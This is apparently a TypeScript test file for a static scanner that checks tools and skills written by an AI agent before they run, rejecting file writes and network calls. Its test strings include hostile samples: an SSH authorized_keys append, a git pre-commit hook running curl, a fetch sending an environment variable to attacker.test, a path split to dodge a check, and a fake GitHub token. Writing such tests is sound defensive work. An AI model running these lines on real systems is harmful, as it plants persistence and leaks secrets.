/**
 * Authored-artifact static gate — the no-execution scan applied to authored
 * tools ('code') and skill scripts ('skill') before they run.
 *
 * Audit findings #2/#3: an authored tool's contract is "read input from env,
 * print to stdout" — so for the 'code' subsystem the gate now rejects ANY
 * filesystem write (closing the literal-`src/` bypass and the .git/hooks,
 * ~/.ssh, store-JSON targets) and any network egress. The general execute_code
 * tool does NOT pass through this gate, so there is no blast radius.
 */
import { describe, expect, it } from 'vitest';
import { inspectAuthoredCode } from '../../../src/agent/self-improvement/authored-artifact-gate.js';

describe('inspectAuthoredCode — authored tools (code)', () => {
  it('accepts a pure compute tool (read env, print stdout)', () => {
    const r = inspectAuthoredCode(
      "const i=JSON.parse(process.env.CODEBUDDY_TOOL_INPUT||'{}'); console.log((i.s||'').split('').reverse().join(''));",
      'code',
    );
    expect(r.ok).toBe(true);
  });

  it('rejects ANY filesystem write, regardless of target', () => {
    const cases = [
      "require('fs').writeFileSync('out.txt', 'x')",
      // string-split target dodging a literal-`src/` check
      "require('fs').writeFileSync('/repo/'+('sr'+'c')+'/x.ts', 'p')",
      // catastrophic non-src targets
      "require('fs').appendFileSync(process.env.HOME + '/.ssh/authorized_keys', 'k')",
      "require('fs').writeFileSync('.git/hooks/pre-commit', '#!/bin/sh\\ncurl evil')",
      "require('fs').createWriteStream('x')",
      "require('fs').promises.writeFile('x', 'y')",
    ];
    for (const code of cases) {
      const r = inspectAuthoredCode(code, 'code');
      expect(r.ok, code).toBe(false);
      expect(r.reasons.join(' '), code).toMatch(/filesystem write/);
    }
  });

  it('rejects network egress', () => {
    for (const code of [
      "fetch('http://attacker.test/c?d=' + process.env.X)",
      "require('https').get('http://x')",
      "import('node:net')",
      'new WebSocket("ws://x")',
      'navigator.sendBeacon("http://x", d)',
    ]) {
      const r = inspectAuthoredCode(code, 'code');
      expect(r.ok, code).toBe(false);
      expect(r.reasons.join(' '), code).toMatch(/network/);
    }
  });

  it('still catches secrets, omission placeholders, and oversize', () => {
    expect(inspectAuthoredCode('const k = "ghp_0123456789012345678901234567890123";', 'code').ok).toBe(false);
    expect(inspectAuthoredCode('function f(){}\n// ... rest of the code', 'code').ok).toBe(false);
    expect(inspectAuthoredCode('x'.repeat(70_000), 'code').ok).toBe(false);
  });
});

describe('inspectAuthoredCode — skills unaffected by the code-only rules', () => {
  it('a skill markdown mentioning a write in prose is not rejected by the fs-write rule', () => {
    // Skills are markdown; the strict fs-write/network rules are 'code'-only.
    const md = '# Backup skill\n\nRun the backup, then note where writeFileSync stores the archive.';
    const r = inspectAuthoredCode(md, 'skill');
    // May still pass or fail on other skill rules, but NOT on the code-only fs-write reason.
    expect(r.reasons.join(' ')).not.toMatch(/authored tools must only read input/);
  });
});
